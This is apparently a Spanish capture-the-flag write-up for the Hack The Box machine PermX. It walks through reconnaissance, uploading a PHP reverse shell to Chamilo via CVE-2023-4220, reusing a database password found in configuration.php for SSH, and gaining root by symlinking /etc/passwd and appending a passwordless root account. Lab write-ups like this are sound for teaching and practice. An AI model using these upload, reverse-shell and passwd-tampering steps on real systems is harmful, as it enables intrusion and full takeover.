# Reconocimiento
sudo nmap -sS -sV -A --min-rate 5000 --open -vvv -Pn 10.10.11.23

# Resultado

| port | state | service | reason | version |
|------|-------|---------|--------|---------|
| 22 | open | ssh |  syn-ack | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) |
| 80 | open | http |  syn-ack | Apache httpd 2.4.52 |

- Copiamos la ip en la url de nuestro navegador.
- revisamos la web cargada.
- encontramos la url (http://permx.htb/).

# Copiamos la url en el archivo
- cd nano /etc/hosts
- ip 10.10.11.23 http://permx.htb/
- guardamos con ctrl + s
- ctrl + x

# Realizamos un escaneo con
> whatweb -v -a 3 http://permx.htb/ 

# Encontramos

| Resultado |
|-----------|
| Summary   : Apache[2.4.52], |
|  Bootstrap[5.0.0] |
| Email[permx@htb.com] |
| HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)] |
| JQuery[3.4.1] |

# Ataque de directorio con Gobuster

| ataque | estado |
|--------|--------|
| sudo gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://permx.htb --append-domain | grep -v "Status: 302" | exitoso |

| resultado |
|-----------|
| lms.permx.htb |

# Reconocimiento de la nueva url encontrada con whatweb

|Ataque|
|------|
| whatweb -v -a 3 http://lms.permx.htb/index.php |


|resultados|
|----------|
| Apache |
| Version      : 2.4.52 (from HTTP Server Header) Google Dorks: (3)  
| Website     : http://httpd.apache.org/ |

# CVE

- CVE-2023-4220

- Investigamos en internet la revershell que podriamos usar con este CVE
- Descargamos la shell
- La enviamos al servidor 

> curl -F 'bigUploadFile=@sheel.php' 'http://lms.permx.htb//main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported' 

- Nos colocamos en escucha

| nc |
|----|
| sudo nc -lvnp 9001 |

- Ejecutamos la Revershell

> curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/sheel.php'

- Ingresamos al servidor y importamos una libreria de python para obtener una bash

| importamos bash |
|-----------------|
| python3 -c 'import pty;pty.spawn("/bin/bash")' |


- Buscamos la existencia de otros usuarios

> cat /etc/passwd | grep -i sh$

|resultados|
|----------|
| root:x:0:0:root:/root:/bin/bash|
|mtz:x:1000:1000:mtz:/home/mtz:/bin/bash |

- Realizamos una busqueda por ficheros

> find ./ | grep “configuration.php” 2>dev/null 


- Dentro de la busqueda encontramos la siguiente linea 


> cat ./var/www/chamilo/app/config/configuration.php 


- Esto nos da resultados de la configuracion de la base de datos
- 
> Database connection settings.
> $_configuration['db_host'] = 'localhost';
> $_configuration['db_port'] = '3306';
> $_configuration['main_database'] = 'chamilo';
> $_configuration['db_user'] = 'chamilo';
> $_configuration['db_password'] = '03F6lY3uXAP2bkW8';
> Enable access to database management for platform admins.
> $_configuration['db_manager_enabled'] = false;

- Nos conectamos por ssh con ese usuario de la db

| ruta | passwd |
| ssh mtz@permx.htb   | 03F6lY3uXAP2bkW8 |


> flag 1 encontrada dentro de user.txt

# Proceso de escalada de privilegios

- Ejecutamos  

> sudo -l 

- Para saber que permisos tenemos para ejecutar como este usuario
- Vemos un script llamado


> acl.sh 

- Este esript nos permite modificar los permisos dentro del path de /home/mtz

- con el comando
> ln -s /etc/passwd /home/mtz/test 
- creamos un link entre 
 > /etc/passwd 
-  y 
 > /home/mtz/test 
- lo que nos va a permitir tener una comunicacion directa con passwd a traves de 
> /home/mtz/test 

para que tengamos los permisos tenemos que ejecutar el siguiente comando

> sudo /opt/acl.sh mtz rw /home/mtz/test 

- este comando lo que hace es que a traves de 

> sudo /opt/acl.sh  

- le asigna a 

>  mtz 

- los permisos de escritura y lectura
 
> rw 

- al archivo que asignamos con el link  

> /home/mtz/test 

- anterior para poder tener acceso y con 

> echo "root3::0:0:root3:/root:/bin/bash" >> ./test
 
- creamos un root llamado root3 y les damos los mismos permisos de root ya con esto solo ejecutamos 

> su root3 

- y tendremos los privilegios de root 

-realizamos un cd..
-luego cd ..
-luego cd root
-y encontramos la flag dentro de root.txt

